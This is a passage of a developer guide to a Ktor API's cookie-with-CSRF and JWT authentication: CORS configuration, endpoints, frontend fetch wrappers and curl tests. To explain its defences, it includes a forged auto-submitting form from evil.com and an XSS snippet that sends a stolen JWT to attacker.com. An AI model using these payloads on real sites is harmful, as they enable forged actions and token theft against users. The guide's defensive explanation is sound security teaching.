# Authentication Guide: Cookie-Based and JWT Authentication

This project implements two secure authentication methods: **cookie-based sessions** and **JWT (JSON Web Token)**
authentication. Both approaches are stateless (no server-side session storage) and production-ready, allowing you to
choose the best method for your use case.

**Cookie-based authentication** with CORS support and CSRF protection enables multiple frontend applications on
different domains to authenticate with a centralized backend API.

**JWT authentication** provides a simpler, stateless alternative ideal for APIs, mobile apps, and scenarios where you
want to avoid CSRF complexity.

## 📋 Table of Contents

- [Overview](#overview)
- [Choosing Between Cookie-Based and JWT Authentication](#choosing-between-cookie-based-and-jwt-authentication)
- [Architecture](#architecture)
- [Configuration](#configuration)
- [Security Model](#security-model)
- [Cookie-Based Authentication](#cookie-based-authentication)
    - [CSRF Protection](#csrf-protection)
    - [Cookie API Endpoints](#cookie-api-endpoints)
    - [Cookie Frontend Integration](#cookie-frontend-integration)
- [JWT Authentication](#jwt-authentication)
    - [JWT API Endpoints](#jwt-api-endpoints)
    - [JWT Frontend Integration](#jwt-frontend-integration)
    - [JWT Security Considerations](#jwt-security-considerations)
- [Testing](#testing)
- [Deployment](#deployment)
- [Troubleshooting](#troubleshooting)
- [Production Considerations](#production-considerations)

---

## Overview

### What This Project Provides

This application implements **two authentication methods**, each with different strengths:

1. **Cookie-Based Authentication** - Uses encrypted cookies with CSRF protection, ideal for traditional web applications
2. **JWT Authentication** - Uses signed tokens in Authorization headers, ideal for APIs and mobile apps

Both methods are **stateless** (no server-side session storage) and production-ready.

---

## Choosing Between Cookie-Based and JWT Authentication

### Quick Decision Guide

**Use Cookie-Based Authentication When:**

- ✅ Building traditional web applications with browser clients
- ✅ You want automatic credential handling (browser manages cookies)
- ✅ Your frontend and backend are on the same or related domains
- ✅ You prefer simpler client-side code (no manual token management)
- ✅ Maximum XSS protection is critical (httpOnly cookies can't be accessed by JavaScript)

**Use JWT Authentication When:**

- ✅ Building REST APIs consumed by mobile apps or third-party services
- ✅ Your frontend and backend are on completely different domains
- ✅ You need to support multiple client types (web, mobile, desktop, IoT)
- ✅ You want to avoid CSRF protection complexity
- ✅ You need custom claims in tokens for authorization logic
- ✅ You prefer explicit authentication (no automatic credential sending)

### Detailed Comparison

| Aspect                    | Cookie-Based                           | JWT                                     |
|---------------------------|----------------------------------------|-----------------------------------------|
| **Transport**             | Automatic (browser sends cookies)      | Manual (Authorization header)           |
| **CSRF Protection**       | ✅ Required (when using SameSite=None)  | ❌ Not needed                            |
| **XSS Protection**        | ✅ Excellent (httpOnly cookies)         | ⚠️ Vulnerable if stored in localStorage |
| **Client Complexity**     | Low (browser handles it)               | Medium (manual token management)        |
| **Cross-Domain**          | Works with CORS + SameSite=None        | Simpler for different domains           |
| **Mobile/API Clients**    | More complex                           | ✅ Native support                        |
| **Server-Side Storage**   | None (stateless - encrypted in cookie) | None (stateless - signed token)         |
| **Data Format**           | Encrypted with AES + HMAC signed       | Signed with HMAC256, base64-encoded     |
| **Cookie Support Needed** | Yes (fails if cookies disabled)        | No                                      |
| **Best For**              | Web applications                       | APIs, mobile apps, microservices        |

### Architecture Note: Both Are Stateless

**Important:** In this implementation, **both authentication methods are stateless**:

- **Cookie-Based**: Session data (userId, csrfToken) is encrypted and stored in the cookie on the client side. The
  server decrypts and validates the cookie on each request. No server-side session storage.

- **JWT**: Token data (userId, claims) is signed and sent in the Authorization header. The server validates the
  signature on each request. No server-side session storage.

Neither approach stores session data on the server, making them equally scalable.

---

## Cookie-Based Authentication Overview

### What This Method Provides

This application uses **cookie-based authentication with CORS** to support authentication from multiple different
domains, combined with **CSRF token validation** for all authenticated requests.

**Ideal for:**

- Multi-tenant SaaS applications
- White-label applications with partner-branded domains
- Microservices architectures with frontends on different domains
- Third-party integrations and partner applications

**Key Features:**

- Explicit domain allowlist (no wildcards)
- HttpOnly, Secure cookies with SameSite=None
- Centralized CSRF validation for all authenticated requests
- Clear error responses (401 vs 403)
- Production-ready security

---

## Architecture

### High-Level Design

```
┌──────────────────────┐
│ Frontend Domain 1    │──┐
│ (www.myapp.com)      │  │
└──────────────────────┘  │
                          │
┌──────────────────────┐  │     ┌─────────────────────────┐
│ Frontend Domain 2    │  ├────→│ Backend API             │
│ (another-domain.org) │  │     │ (Ktor Application)      │
└──────────────────────┘  │     │                         │
                          │     │ - Session Management    │
┌──────────────────────┐  │     │ - Authentication        │
│ Frontend Domain 3    │──┘     │ - CORS Handler          │
│ (partner.com)        │        │ - CSRF Validation       │
└──────────────────────┘        └─────────────────────────┘
```

**Key Characteristics:**

- Cookies stored for backend domain only (not shared between frontends)
- Each frontend makes cross-origin requests with `credentials: 'include'`
- CORS validates each request against explicit allowlist
- Session cookies use `SameSite=None` for cross-domain usage
- CSRF tokens validated for all authenticated requests

### Authentication Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                  Complete Authentication Flow                    │
└─────────────────────────────────────────────────────────────────┘

1. User visits frontend (www.myapp.com)
         ↓
2. Frontend submits login via AJAX POST
         ↓
3. Backend validates credentials
         ↓
4. Backend generates CSRF token (UUID)
         ↓
5. Backend creates encrypted session with CSRF token
         ↓
6. Backend sets HttpOnly cookie + returns CSRF token in JSON
         ↓
7. Frontend stores CSRF token in memory
         ↓
8. Subsequent requests include:
   - Cookie (automatic via credentials: 'include')
   - X-CSRF-Token header (manual)
         ↓
9. Backend validates in validate block:
   - Has session cookie? → Yes → Continue
   - CSRF token matches? → Yes → Process request
                        → No → 403 Forbidden
```

### Request Flow with CSRF

```
Request arrives at authenticated endpoint
         ↓
Ktor checks for session cookie
         ↓
   ┌─────────────────────────────────────┐
   │ Has valid session cookie?           │
   └─────────────────────────────────────┘
         ↓ YES                    ↓ NO
         ↓                        ↓
validate { session ->        Challenge block
  session.takeIf {           → 401 "Authentication required"
    validCsrfToken(it)   
  }                      
}                        
         ↓
   ┌─────────────────────────────────────┐
   │ CSRF token valid?                   │
   └─────────────────────────────────────┘
         ↓ YES                    ↓ NO (returns null)
         ↓                        ↓
✅ Process request           Challenge block
                             → 403 "Invalid or missing CSRF token"
```

---

## Configuration

### CORS Configuration

Located in `src/main/kotlin/com/vshpynta/Main.kt`:

```kotlin
install(CORS) {
    // HTTP methods GET, POST are allowed by default
    allowMethod(HttpMethod.Put)
    allowMethod(HttpMethod.Delete)

    // Development: Allow localhost with different ports
    allowHost("localhost:4207")
    allowHost("127.0.0.1:9876")

    // Production: Explicitly allowed domains (HTTPS enforced)
    allowHost("www.myapp.com", schemes = listOf("https"))
    allowHost("another-domain.org", schemes = listOf("https"))

    // Required for cookie-based authentication across origins
    allowCredentials = true
}
```

**What This Configuration Does:**

- **Whitelists domains** that can use JavaScript (`fetch`, `axios`, etc.) to call your API
- **Enables cookie transmission** via `allowCredentials = true`
- **Enforces HTTPS** in production via `schemes = listOf("https")`
- **Prevents data theft** by blocking JavaScript from unauthorized domains

**Important Notes:**

- CORS **only applies to JavaScript** - HTML forms can submit to any domain
- CORS **controls reading responses** - doesn't prevent form submissions
- This is why **CSRF tokens are also required** (see Security Model section)
- Each domain explicitly listed (no wildcards for security)

### Cookie Configuration

**Environment-Specific Settings:**

| Environment                      | useSecureCookie | cookieSameSite | Purpose                    |
|----------------------------------|-----------------|----------------|----------------------------|
| **Local** (`app-local.conf`)     | `false`         | `Lax`          | HTTP allowed for localhost |
| **Base** (`app.conf`)            | `true`          | `Lax`          | Default settings           |
| **Production** (`app-prod.conf`) | `true`          | `none`         | Cross-domain cookies       |

**Cookie Properties:**

- **HttpOnly**: Yes (JavaScript cannot access - XSS protection)
- **Secure**: Yes in production (HTTPS only - MITM protection)
- **SameSite**: `None` in production (enables cross-domain), `Lax` in local
- **Domain**: Not set (cookies bound to backend domain only)
- **Path**: `/`
- **MaxAge**: 1 day (86400 seconds)

---

## Security Model

### Stateless Architecture

Both authentication methods in this project are **stateless**:

- **Cookie-Based**: Session data encrypted in client-side cookie, server decrypts on each request
- **JWT**: Token data signed and sent in Authorization header, server validates signature on each request
- **No Server Storage**: Neither method stores session data on the server, enabling horizontal scaling

### Protection Layers

| Security Feature          | Cookie-Based          | JWT                | Implementation               | Benefit                                   |
|---------------------------|-----------------------|--------------------|------------------------------|-------------------------------------------|
| **HttpOnly Cookies**      | ✅ Always              | N/A                | Session storage              | JavaScript cannot access (XSS protection) |
| **Secure Flag**           | ✅ Production          | N/A                | Cookie attribute             | HTTPS required (MITM protection)          |
| **HTTPS Enforcement**     | ✅ Production          | ✅ Production       | CORS schemes / best practice | Encrypted transport                       |
| **Explicit Allowlist**    | ✅ Always              | ✅ Always           | CORS allowHost               | No wildcards, manual approval             |
| **Encrypted/Signed Data** | ✅ Always (AES + HMAC) | ✅ Always (HMAC256) | Ktor Sessions / JWT          | Tamper-proof credentials                  |
| **CSRF Tokens**           | ✅ Always              | ❌ Not needed       | Validate block               | Protects against forged requests          |
| **Token Expiration**      | ✅ 1 day               | ✅ 1 day            | MaxAge / exp claim           | Automatic session expiry                  |
| **JSON Responses**        | ✅ Always              | ✅ Always           | API design                   | Proper status codes, no redirects         |

### Two Separate Security Mechanisms

This application uses **two independent security layers** that protect against different types of attacks:

#### 1. CORS (Cross-Origin Resource Sharing) - Controls JavaScript Access

```kotlin
// Controls which domains can use JavaScript to call the API
allowHost("www.myapp.com", schemes = listOf("https"))
allowHost("another-domain.org", schemes = listOf("https"))
```

**What CORS Protects:**

- ✅ Prevents JavaScript on `evil.com` from calling `fetch("your-api.com/api/users")` and **reading the response**
- ✅ Blocks data theft via malicious JavaScript
- ✅ Whitelists legitimate frontend domains

**What CORS Does NOT Protect:**

- ❌ HTML form submissions (forms bypass CORS entirely)
- ❌ Direct HTTP requests without JavaScript
- ❌ The attack scenario described below

**Important:** CORS is a **browser-enforced** mechanism that only applies to JavaScript. HTML forms can submit to any
domain regardless of CORS configuration.

#### 2. CSRF Tokens - Protects Against Forged Requests

**Why CSRF Protection is Essential:**

When using `SameSite=None` for cross-domain authentication, browsers send cookies with **all** cross-site requests,
including malicious ones.

**Attack Scenario Without CSRF Protection (CORS Cannot Stop This):**

```html
<!-- Malicious website: evil.com -->
<form action="https://your-api.com/api/users" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked">
</form>
<script>
    document.forms[0].submit();  // Auto-submit when user visits
</script>
```

**What happens:**

1. User is logged into your-api.com ✓
2. User visits evil.com
3. Malicious form auto-submits to your-api.com
4. Browser includes session cookie (SameSite=None allows this!)
5. **CORS does not block this** (forms bypass CORS)
6. ❌ Without CSRF protection, request succeeds

**How CSRF Tokens Prevent This:**

CSRF tokens require a **custom HTTP header** (`X-CSRF-Token`) that:

- ✅ HTML forms **cannot set** (only JavaScript can set custom headers)
- ✅ Requires `fetch()` or `XMLHttpRequest` from an allowed domain
- ✅ Attacker cannot obtain token due to Same-Origin Policy

The attacker **cannot obtain the CSRF token** because:

- Token generated server-side (cryptographically random UUID)
- Stored in encrypted session cookie (HttpOnly, server-side)
- Returned only via AJAX response (not visible in HTML)
- Same-Origin Policy prevents cross-site reading
- Token changes with each login session

### Why You Need Both CORS and CSRF

```
┌─────────────────────────────────────────────────────────────┐
│ Attack Vector: Malicious HTML Form                         │
│ <form action="your-api.com/api/users" method="POST">      │
└─────────────────────────────────────────────────────────────┘
         │
         ├─ Cookie sent? YES (SameSite=None)
         ├─ CORS blocks it? NO ❌ (forms bypass CORS)
         └─ CSRF blocks it? YES ✅ (no X-CSRF-Token header)

┌─────────────────────────────────────────────────────────────┐
│ Attack Vector: Malicious JavaScript                        │
│ fetch("your-api.com/api/users", {credentials: "include"})  │
└─────────────────────────────────────────────────────────────┘
         │
         ├─ Cookie sent? YES (credentials: 'include')
         ├─ CORS blocks it? YES ✅ (evil.com not in allowHost)
         └─ Never reaches CSRF check (blocked by browser first)
```

**Summary:**

- **CORS `allowHost`** = Whitelist for JavaScript API access (prevents data theft)
- **CSRF tokens** = Protection against forged requests (prevents unauthorized actions)
- **Both are required** because they defend against different attack vectors

---

## CSRF Protection

### Implementation Overview

CSRF protection is centralized in the session authentication `validate` block, providing automatic validation for **all
authenticated requests** (GET, POST, PUT, DELETE, etc.).

**Note:** Unlike traditional CSRF protection that only validates state-changing operations, this implementation protects
all HTTP methods for enhanced security with cross-domain cookies.

### 1. Session Data Structure

```kotlin
@Serializable
data class UserSession(
    val userId: Long,
    val csrfToken: String  // ← CSRF token stored with session
) : Principal
```

### 2. Login - Generate CSRF Token

```kotlin
post("/api/login", webResponse {
    sessionOf(dataSource).use { dbSession ->
        val userId = authenticateUser(dbSession, username, password)

        if (userId != null) {
            // Generate cryptographically random CSRF token
            val csrfToken = java.util.UUID.randomUUID().toString()

            // Store in encrypted session cookie
            call.sessions.set(
                UserSession(
                    userId = userId,
                    csrfToken = csrfToken
                )
            )

            // Return token to client
            JsonWebResponse(
                body = mapOf(
                    "success" to true,
                    "message" to "Login successful",
                    "csrfToken" to csrfToken  // ← Client stores in memory
                )
            )
        } else {
            JsonWebResponse(
                body = mapOf("error" to "Invalid credentials"),
                statusCode = 401
            )
        }
    }
})
```

### 3. Session Authentication with CSRF Validation

```kotlin
session<UserSession>(SESSION_AUTH_PROVIDER) {
    // Validate session and CSRF token (centralized)
    // Note: session parameter is always non-null (Ktor guarantees this)
    validate { session ->
        // Returns session if CSRF token valid, null if invalid
        session.takeIf { validCsrfToken(it) }
    }

    // Challenge block: distinguish between failure types
    challenge {
        // IMPORTANT: call.principal<UserSession>() is null here
        // because validate() returned null, so access session directly
        val session = call.sessions.get<UserSession>()

        if (session != null) {
            // Session cookie exists but CSRF validation failed
            call.respond(
                KtorJsonWebResponse(
                    body = mapOf("error" to "Invalid or missing CSRF token"),
                    status = HttpStatusCode.Forbidden  // 403
                )
            )
        } else {
            // No session cookie at all
            call.respond(
                KtorJsonWebResponse(
                    body = mapOf("error" to "Authentication required", "requiresAuth" to true),
                    status = HttpStatusCode.Unauthorized  // 401
                )
            )
        }
    }
}
```

### 4. CSRF Validation Helper

```kotlin
/**
 * Validates CSRF token for all authenticated requests.
 * 
 * Note: Validates ALL HTTP methods (GET, POST, PUT, DELETE, etc.),
 * providing additional security for cross-domain cookies with SameSite=None.
 */
private fun ApplicationCall.validCsrfToken(session: UserSession): Boolean {
    val providedToken = request.headers["X-CSRF-Token"]
    return providedToken != null && session.csrfToken == providedToken
}
```

### 5. Protected Endpoints

All routes within `authenticate(SESSION_AUTH_PROVIDER)` are **automatically CSRF-protected**:

```kotlin
authenticate(SESSION_AUTH_PROVIDER) {
    // CSRF validation happens automatically in validate block
    // No manual checks needed in individual endpoints

    get("/api/secret", webResponseDb(dataSource) { dbSession ->
        val userSession = call.principal<UserSession>()!!
        val user = findUserById(dbSession, userSession.userId)!!

        HtmlWebResponse(
            AppLayout("Welcome, ${user.email}").apply {
                pageBody {
                    h1 { +"Hello there, ${user.email}" }
                    p { +"You're logged in." }
                    p { a(href = "/api/logout") { +"Log out" } }
                }
            }
        )
    })
}
```

### Key CSRF Properties

| Property               | Implementation                | Benefit                 |
|------------------------|-------------------------------|-------------------------|
| **Token Uniqueness**   | UUID per session              | Unguessable             |
| **Token Storage**      | Encrypted in HttpOnly cookie  | Server-side only        |
| **Token Transmission** | JSON response                 | Client stores in memory |
| **Token Validation**   | Centralized in validate block | All requests protected  |
| **Token Lifetime**     | Tied to session (1 day)       | Expires automatically   |
| **Validation Scope**   | All HTTP methods              | Enhanced security       |

### Error Responses

| Status Code          | Meaning                    | Client Action                         |
|----------------------|----------------------------|---------------------------------------|
| **401 Unauthorized** | No session cookie          | Redirect to login                     |
| **403 Forbidden**    | Invalid/missing CSRF token | Check X-CSRF-Token header or re-login |

---

## Cookie-Based Authentication

## Cookie API Endpoints

### Authentication Endpoints

| Endpoint      | Method | Request                        | Success (200)                                                          | Failure                                |
|---------------|--------|--------------------------------|------------------------------------------------------------------------|----------------------------------------|
| `/api/login`  | POST   | `username` & `password` (form) | `{"success": true, "message": "Login successful", "csrfToken": "..."}` | `401 {"error": "Invalid credentials"}` |
| `/api/logout` | GET    | -                              | `{"success": true, "message": "Logged out successfully"}`              | -                                      |
| `/api/secret` | GET    | Requires auth + CSRF           | HTML page                                                              | `401` or `403 {"error": "..."}`        |

### Login Endpoint Details

**Request:**

```http
POST /api/login
Content-Type: application/x-www-form-urlencoded

username=user@example.com&password=password
```

**Success Response (200):**

```json
{
  "success": true,
  "message": "Login successful",
  "csrfToken": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
}
```

**Failure Response (401):**

```json
{
  "error": "Invalid credentials"
}
```

**Headers Set:**

```http
Set-Cookie: user-session=<encrypted-value>; Max-Age=86400; Path=/; HttpOnly; Secure; SameSite=None
```

### Logout Endpoint Details

**Request:**

```http
GET /api/logout
```

**Response (200):**

```json
{
  "success": true,
  "message": "Logged out successfully"
}
```

Session cookie is cleared automatically.

### Protected Endpoints

All routes wrapped in `authenticate(SESSION_AUTH_PROVIDER)` require:

1. Valid session cookie
2. Valid CSRF token in `X-CSRF-Token` header

**Missing/invalid authentication triggers challenge block:**

- No session → 401 "Authentication required"
- Invalid CSRF → 403 "Invalid or missing CSRF token"

---

## Cookie Frontend Integration

### Requirements

Frontend applications **must**:

1. Use HTTPS in production
2. Include `credentials: 'include'` in all fetch requests
3. Store CSRF token in JavaScript memory (not localStorage)
4. Include `X-CSRF-Token` header in all authenticated requests
5. Handle 401 and 403 responses appropriately

### Complete Authentication Flow

```javascript
// Global CSRF token storage (in memory only!)
let csrfToken = null;

// 1. Login
async function login(username, password) {
    const response = await fetch('https://api-service.com/api/login', {
        method: 'POST',
        credentials: 'include',  // ← CRITICAL for cross-domain cookies
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams({ username, password })
    });
    
    const data = await response.json();
    
    if (response.ok) {
        // Store CSRF token in memory
        csrfToken = data.csrfToken;
        console.log('Login successful');
        return true;
    } else {
        console.error(data.error);
        return false;
    }
}

// 2. Access protected resources
async function fetchUserData() {
    if (!csrfToken) {
        console.error('No CSRF token. Please login first.');
        window.location.href = '/login';
        return null;
    }
    
    const response = await fetch('https://api-service.com/api/secret', {
        credentials: 'include',  // Include session cookie
        headers: {
            'X-CSRF-Token': csrfToken  // Include CSRF token
        }
    });
    
    if (response.status === 401) {
        // Not authenticated - redirect to login
        window.location.href = '/login';
        return null;
    } else if (response.status === 403) {
        // CSRF validation failed
        console.error('CSRF token invalid or missing');
        window.location.href = '/login';
        return null;
    }
    
    return await response.text();  // HTML content
}

// 3. Logout
async function logout() {
    const response = await fetch('https://api-service.com/api/logout', {
        credentials: 'include'
    });
    
    const data = await response.json();
    console.log(data.message);
    
    // Clear CSRF token
    csrfToken = null;
    
    // Redirect to home or login
    window.location.href = '/';
}
```

### Global Fetch Wrapper (Recommended)

```javascript
/**
 * Wrapper for all authenticated requests
 * Automatically includes credentials and CSRF token
 */
async function authenticatedFetch(url, options = {}) {
    // Check if CSRF token exists
    if (!csrfToken) {
        console.error('No CSRF token available');
        window.location.href = '/login';
        return null;
    }
    
    // Make request with credentials and CSRF token
    const response = await fetch(url, {
        ...options,
        credentials: 'include',  // Always include
        headers: {
            ...options.headers,
            'X-CSRF-Token': csrfToken  // Always include
        }
    });
    
    // Handle authentication failures
    if (response.status === 401) {
        console.error('Authentication required');
        window.location.href = '/login';
        return null;
    } else if (response.status === 403) {
        console.error('CSRF validation failed');
        window.location.href = '/login';
        return null;
    }
    
    return response;
}

// Usage example
const response = await authenticatedFetch('https://api-service.com/api/users');
const users = await response?.json();
```

### Important Security Notes

**✅ DO:**

- Store CSRF token in JavaScript memory (`let csrfToken = null`)
- Include `credentials: 'include'` on all requests
- Include `X-CSRF-Token` header on all authenticated requests
- Clear token on logout
- Handle 401 and 403 errors appropriately

**❌ DON'T:**

- Store CSRF token in localStorage (vulnerable to XSS)
- Skip `credentials: 'include'` (cookies won't be sent)
- Skip CSRF token header (request will fail with 403)
- Include token in query parameters (logs expose token)
- Share token between browser tabs (each login gets new token)

```javascript
// ❌ BAD: Never do this!
localStorage.setItem('csrfToken', token);

// ✅ GOOD: Store in memory
let csrfToken = null;
```

---

## JWT Authentication

### Overview

JWT (JSON Web Token) authentication provides a **stateless, token-based** authentication method that's ideal for APIs,
mobile applications, and scenarios where you want to avoid CSRF protection complexity.

**Key Characteristics:**

- Tokens are **signed** (not encrypted) using HMAC256
- All user data is **encoded in the token** itself (base64-encoded JSON)
- Tokens are sent in the **Authorization header** (Bearer scheme)
- **No CSRF protection needed** (tokens aren't automatically sent by browsers)
- Tokens **expire after 1 day** (configurable)

**Best For:**

- REST APIs consumed by mobile apps
- Third-party integrations
- Microservices communication
- Single-page applications (with proper storage)
- Cross-domain scenarios without cookie complexity

---

## JWT API Endpoints

### Authentication Endpoints

| Endpoint          | Method | Request                         | Success (200)                   | Failure                                             |
|-------------------|--------|---------------------------------|---------------------------------|-----------------------------------------------------|
| `/api/jwt/login`  | POST   | JSON: `username` & `password`   | `{"token": "eyJ0eXAi..."}`      | `403 {"error": "Invalid username and/or password"}` |
| `/api/jwt/secret` | GET    | `Authorization: Bearer <token>` | `{"hello": "user@example.com"}` | `401 Unauthorized`                                  |

### JWT Login Endpoint Details

**Request:**

```http
POST /api/jwt/login
Content-Type: application/json

{
  "username": "user@example.com",
  "password": "password"
}
```

**Success Response (200):**

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJteUFwcCIsImlzcyI6Imh0dHA6Ly8wLjAuMC4wOjQyMDciLCJ1c2VySWQiOjEsImV4cCI6MTc2NjE4NDg2MH0.ebAQYt20wWK4rTIFKvv5HS0AK2X6a4lPwgY8MkyYYXk"
}
```

**Failure Response (403):**

```json
{
  "error": "Invalid username and/or password"
}
```

**Token Structure:**

The JWT token consists of three parts separated by dots:

```
eyJhbGc...  .  eyJhdWQ...  .  ebAQYt2...
  Header         Payload        Signature
```

**Decoded Payload:**

```json
{
  "aud": "myApp",
  // Audience claim
  "iss": "http://0.0.0.0:4207",
  // Issuer claim
  "userId": 1,
  // Custom user claim
  "exp": 1766184860
  // Expiration timestamp
}
```

### JWT Protected Endpoint Details

**Request:**

```http
GET /api/jwt/secret
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Success Response (200):**

```json
{
  "hello": "user@example.com"
}
```

**Failure Response (401):**

```
Unauthorized
```

**Common Failure Reasons:**

- Token missing from Authorization header
- Token expired (> 1 day old)
- Token signature invalid (tampered or wrong key)
- Token audience doesn't match server configuration

---

## JWT Frontend Integration

### Requirements

Frontend applications **must**:

1. Store JWT token securely (see Security Considerations below)
2. Include `Authorization: Bearer <token>` header in all authenticated requests
3. Handle 401 responses (token expired/invalid)
4. Parse JSON responses
5. **NOT** use `credentials: 'include'` (no cookies involved)

### Complete JWT Authentication Flow

```javascript
// Global JWT token storage
// ⚠️ Security Note: See "JWT Security Considerations" section below
let jwtToken = null;

// 1. Login
async function jwtLogin(username, password) {
    const response = await fetch('https://api-service.com/api/jwt/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    });
    
    const data = await response.json();
    
    if (response.ok) {
        // Store JWT token
        jwtToken = data.token;
        console.log('JWT login successful');
        return true;
    } else {
        console.error(data.error);
        return false;
    }
}

// 2. Access protected resources
async function fetchProtectedData() {
    if (!jwtToken) {
        console.error('No JWT token. Please login first.');
        window.location.href = '/login';
        return null;
    }
    
    const response = await fetch('https://api-service.com/api/jwt/secret', {
        headers: {
            'Authorization': `Bearer ${jwtToken}`  // Include token
        }
        // Note: NO credentials: 'include' - JWT doesn't use cookies
    });
    
    if (response.status === 401) {
        // Token expired or invalid - redirect to login
        console.error('JWT token expired or invalid');
        jwtToken = null;
        window.location.href = '/login';
        return null;
    }
    
    return await response.json();
}

// 3. Logout (client-side only)
function jwtLogout() {
    // Simply clear the token
    jwtToken = null;
    console.log('Logged out');
    window.location.href = '/';
}
```

### Global JWT Fetch Wrapper (Recommended)

```javascript
/**
 * Wrapper for all JWT-authenticated requests
 * Automatically includes Bearer token in Authorization header
 */
async function jwtFetch(url, options = {}) {
    // Check if JWT token exists
    if (!jwtToken) {
        console.error('No JWT token available');
        window.location.href = '/login';
        return null;
    }
    
    // Make request with Authorization header
    const response = await fetch(url, {
        ...options,
        headers: {
            ...options.headers,
            'Authorization': `Bearer ${jwtToken}`  // Always include
        }
        // Note: NO credentials: 'include' needed
    });
    
    // Handle token expiration/invalidity
    if (response.status === 401) {
        console.error('JWT token expired or invalid');
        jwtToken = null;
        window.location.href = '/login';
        return null;
    }
    
    return response;
}

// Usage example
const response = await jwtFetch('https://api-service.com/api/jwt/secret');
const data = await response?.json();
```

### Comparison: JWT vs Cookie Authentication Flow

| Step                 | Cookie-Based                    | JWT                             |
|----------------------|---------------------------------|---------------------------------|
| **Login Request**    | Form-urlencoded                 | JSON                            |
| **Login Response**   | CSRF token + cookie (automatic) | JWT token (manual storage)      |
| **Credentials Sent** | `credentials: 'include'`        | `Authorization: Bearer <token>` |
| **CSRF Header**      | Required (`X-CSRF-Token`)       | Not needed                      |
| **Logout**           | Server clears cookie            | Client clears token             |
| **Token Validation** | Automatic (browser)             | Manual (each request)           |

---

## JWT Security Considerations

### Critical Security Warning: XSS Vulnerability

**JWT tokens are vulnerable to XSS attacks if stored improperly!**

Unlike httpOnly cookies (which JavaScript cannot access), JWT tokens stored in JavaScript-accessible locations can be
stolen by malicious scripts.

### Storage Options Comparison

| Storage Method        | Security                 | Persistence           | Best For                             |
|-----------------------|--------------------------|-----------------------|--------------------------------------|
| **localStorage**      | ⚠️ **VULNERABLE** to XSS | Survives page refresh | ❌ **NOT RECOMMENDED**                |
| **sessionStorage**    | ⚠️ **VULNERABLE** to XSS | Lost on tab close     | ❌ **NOT RECOMMENDED**                |
| **JavaScript Memory** | ⚠️ Vulnerable to XSS     | Lost on page refresh  | ⚠️ Acceptable with CSP               |
| **httpOnly Cookie**   | ✅ **SECURE** (XSS-proof) | Configurable          | ✅ **BEST** (but defeats JWT purpose) |

### XSS Attack Scenario

```javascript
// ❌ VULNERABLE: Token stored in localStorage
localStorage.setItem('jwtToken', token);

// Attacker injects malicious script via XSS vulnerability:
<script>
  const token = localStorage.getItem('jwtToken');
  // Send token to attacker's server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token })
  });
</script>

// Attacker can now impersonate the user until token expires!
```

### Security Best Practices for JWT in Browsers

**If you MUST use JWT in a browser-based application:**

1. **Store in Memory Only** (Best compromise)
   ```javascript
   // Store in closure or React state
   let jwtToken = null;  // Lost on page refresh
   ```

2. **Use Short Expiration Times**
   ```kotlin
   // Backend: Set short expiry (e.g., 15 minutes instead of 1 day)
   .withExpiresAt(Date.from(LocalDateTime.now().plusMinutes(15).toInstant(ZoneOffset.UTC)))
   ```

3. **Implement Refresh Token Rotation**
    - Use short-lived access tokens (15 min)
    - Use long-lived refresh tokens (httpOnly cookie!)
    - Rotate refresh tokens on each use

4. **Add Content Security Policy (CSP) Headers**
   ```kotlin
   install(DefaultHeaders) {
       header("Content-Security-Policy", "default-src 'self'; script-src 'self'")
   }
   ```

5. **Sanitize All User Inputs** (Prevent XSS)
   ```javascript
   // Always escape user content
   element.textContent = userInput;  // Safe
   element.innerHTML = userInput;    // Dangerous!
   ```

6. **Consider httpOnly Cookies for Tokens**
   ```kotlin
   // If you need httpOnly security, use cookie-based auth instead!
   // JWT in httpOnly cookies defeats the purpose of JWT
   ```

### Cookie-Based vs JWT Security

| Attack Type     | Cookie-Based (httpOnly) | JWT (localStorage)  | JWT (memory)        |
|-----------------|-------------------------|---------------------|---------------------|
| **XSS**         | ✅ **Protected**         | ❌ **VULNERABLE**    | ⚠️ **VULNERABLE**   |
| **CSRF**        | ⚠️ Requires protection  | ✅ **Protected**     | ✅ **Protected**     |
| **MITM**        | ✅ Protected (HTTPS)     | ✅ Protected (HTTPS) | ✅ Protected (HTTPS) |
| **Token Theft** | ✅ Very difficult        | ❌ Easy via XSS      | ⚠️ Possible via XSS |

### Recommendation

**For Browser-Based Web Applications:**

- ✅ **Use cookie-based authentication** (httpOnly cookies provide excellent XSS protection)
- Your implementation with encrypted cookies + CSRF tokens is more secure than JWT for browsers

**For Mobile Apps / APIs / Third-Party Integrations:**

- ✅ **Use JWT authentication** (no cookie support needed, easier to implement)

**For SPAs (Single-Page Applications):**

- If on same domain: Use cookie-based auth
- If cross-domain: Consider JWT with strict CSP and short expiry
- Best of both: Refresh token (httpOnly cookie) + Access token (memory)

### Important Note: Cookies Disabled

**If users disable cookies in their browser:**

- Cookie-based authentication **will not work at all**
- JWT authentication still works (no cookies needed)
- Consider offering both methods with automatic fallback

**Detection:**

```javascript
if (!navigator.cookieEnabled) {
    console.warn('Cookies disabled. Using JWT authentication.');
    // Fallback to JWT login
}
```

---

## Testing

### Test CORS Preflight

```bash
curl -H "Origin: https://yourdomain.com" \
     -H "Access-Control-Request-Method: POST" \
     -H "Access-Control-Request-Headers: Content-Type" \
     -X OPTIONS \
     https://your-api.com/api/login -v

# Expected response headers:
# Access-Control-Allow-Origin: https://yourdomain.com
# Access-Control-Allow-Credentials: true
# Access-Control-Allow-Methods: POST
```

### Test Complete Authentication Flow

**1. Login and capture CSRF token:**

```bash
curl -X POST http://localhost:4207/api/login \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=test@example.com&password=password" \
     -c cookies.txt -v

# Expected response:
# HTTP/1.1 200 OK
# Set-Cookie: user-session=...; Max-Age=86400; Path=/; HttpOnly; Secure; SameSite=None
# {"success":true,"message":"Login successful","csrfToken":"abc-123-xyz"}
```

**2. Access protected endpoint with valid CSRF token (should succeed):**

```bash
curl http://localhost:4207/api/secret \
